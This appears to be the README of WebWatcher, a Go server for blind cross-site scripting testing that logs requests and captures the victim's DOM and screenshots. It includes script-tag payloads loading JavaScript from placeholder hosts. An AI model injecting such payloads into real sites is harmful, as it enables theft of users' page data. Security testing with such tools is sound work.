# WebWatcher  
Golang server for testing blind XSS.   
Special endpoint for testing requests and file extensions.  

## Setup  


Setup .wwconfig and add it to your home directory.  
Make sure that `assets` and `templates` are in the directory specified in config.  

Login to your website with /login?token=[token]  

## Usage
After authentication, you can find all requests in `/results/all`.  
Left side is from  XSS requests.  
Right side is from custom path requests.  
![results](_img/results.png)  


### Collecting simple request data from path you specified in config  
This endpoint will contain response specified in `assets/extensions.json` file  

**Example:**  
Set `"CollectorPath":"examplepath"` in `.wwconfig`  
Set `.js` extension with payload `alert(1)` in `assets/extensions.json`  
Insert this payload to the website, alert will popup.  
`<script src=https://domain.com/examplepath.js></script>`  

### Collecting data from blind XSS  
You can find detailed report for your XSS, with DOM and Screenshort.
`<script src=https://example.com></script>`  
![blind xss](_img/blindxss.png)  



